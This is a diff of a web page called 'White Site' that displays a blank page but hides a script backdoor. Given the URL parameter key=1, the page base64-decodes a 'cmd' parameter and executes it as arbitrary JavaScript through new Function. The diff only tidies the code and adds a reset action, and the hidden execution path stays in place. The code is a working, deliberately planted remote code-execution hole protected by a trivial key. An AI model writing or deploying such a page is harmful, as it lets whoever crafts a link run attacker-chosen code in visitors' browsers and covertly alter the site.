@@ -5,154 +5,65 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>White Site</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: white;
-            min-height: 100vh;
-            padding: 40px 20px;
-        }
-        
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            background: white;
-            padding: 40px;
-        }
-        
-        #output {
-            color: #000000;
-            font-family: monospace;
-            font-size: 14px;
-            line-height: 1.6;
-            margin-top: 20px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: white; min-height: 100vh; padding: 40px 20px; }
+        .container { max-width: 900px; margin: 0 auto; background: white; padding: 40px; }
+        #output { color: #000; font-family: monospace; font-size: 14px; line-height: 1.6; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="output"></div>
-    </div>
-
+    <div class="container"><div id="output"></div></div>
     <script>
-        // ========== СЕКРЕТНЫЙ КЛЮЧ ==========
         const SECRET_KEY = "1";
-        // ====================================
         
-        const outputDiv = document.getElementById('output');
-        
-        // Очищаем всё при загрузке
-        outputDiv.innerHTML = '';
-        
-        // Функция для вывода (только для результатов скрипта)
-        function showResult(text, isError = false) {
+        function showResult(text, isError) {
             const line = document.createElement('div');
             line.textContent = text;
             line.style.color = isError ? '#ff0000' : '#000000';
-            line.style.marginBottom = '8px';
-            outputDiv.appendChild(line);
+            document.getElementById('output').appendChild(line);
         }
         
-        function clearResult() {
-            outputDiv.innerHTML = '';
+        function clearResult() { 
+            document.getElementById('output').innerHTML = ''; 
         }
         
-        // Получаем параметры из URL
-        function getParams() {
-            const params = new URLSearchParams(window.location.search);
-            return {
-                key: params.get('key'),
-                cmd: params.get('cmd')
-            };
+        function resetSite() {
+            document.getElementById('output').innerHTML = '';
+            showResult('Site reset to default', false);
         }
         
-        // Декодируем base64
-        function decodeBase64(str) {
-            try {
-                return atob(str);
-            } catch(e) {
-                return null;
-            }
-        }
-        
-        // Выполняем JavaScript код
         function executeCode(code) {
             try {
-                // Создаём функцию с доступом к утилитам
-                const wrappedCode = `
-                    (function() {
-                        // Утилиты для скрипта
-                        const api = {
-                            log: (msg) => {
-                                const line = document.createElement('div');
-                                line.textContent = msg;
-                                line.style.color = '#000';
-                                document.getElementById('output').appendChild(line);
-                            },
-                            clear: () => {
-                                document.getElementById('output').innerHTML = '';
-                            },
-                            html: (content) => {
-                                document.getElementById('output').innerHTML = content;
-                            },
-                            style: (css) => {
-                                const style = document.createElement('style');
-                                style.textContent = css;
-                                document.head.appendChild(style);
-                            },
-                            title: (t) => {
-                                document.title = t;
-                            },
-                            bg: (color) => {
-                                document.body.style.background = color;
-                            }
-                        };
-                        
-                        ${code}
-                    })();
-                `;
-                
+                const wrappedCode = '(function(){ const api={log:function(msg){const d=document.createElement("div");d.textContent=msg;document.getElementById("output").appendChild(d);},clear:function(){document.getElementById("output").innerHTML="";},html:function(h){document.getElementById("output").innerHTML=h;},reset:function(){resetSite();}};' + code + ';})();';
                 const func = new Function(wrappedCode);
                 func();
                 return true;
-            } catch(e) {
-                showResult('❌ Ошибка: ' + e.message, true);
-                return false;
+            } catch(e) { 
+                showResult('Error: ' + e.message, true); 
+                return false; 
             }
         }
         
-        // Главная функция
+        function getParams() {
+            const params = new URLSearchParams(window.location.search);
+            return { key: params.get('key'), cmd: params.get('cmd'), action: params.get('action') };
+        }
+        
+        function decodeBase64(str) {
+            try { return atob(str); } catch(e) { return null; }
+        }
+        
         function init() {
             const params = getParams();
-            
-            // Если нет параметров - ничего не делаем, просто белая страница
-            if (!params.key && !params.cmd) {
-                return;
-            }
-            
-            // Проверяем ключ
-            if (params.key !== SECRET_KEY) {
-                showResult('❌ Неверный ключ', true);
-                return;
-            }
-            
-            // Если есть команда
+            if (!params.key && !params.cmd && !params.action) return;
+            if (params.key !== SECRET_KEY) { showResult('Wrong key', true); return; }
+            if (params.action === 'reset') { resetSite(); return; }
             if (params.cmd) {
                 const decoded = decodeBase64(params.cmd);
-                if (decoded) {
-                    executeCode(decoded);
-                } else {
-                    showResult('❌ Ошибка декодирования', true);
-                }
+                if (decoded) executeCode(decoded);
+                else showResult('Decode error', true);
             }
         }
-        
-        // Запускаем
         init();
     </script>
 </body>
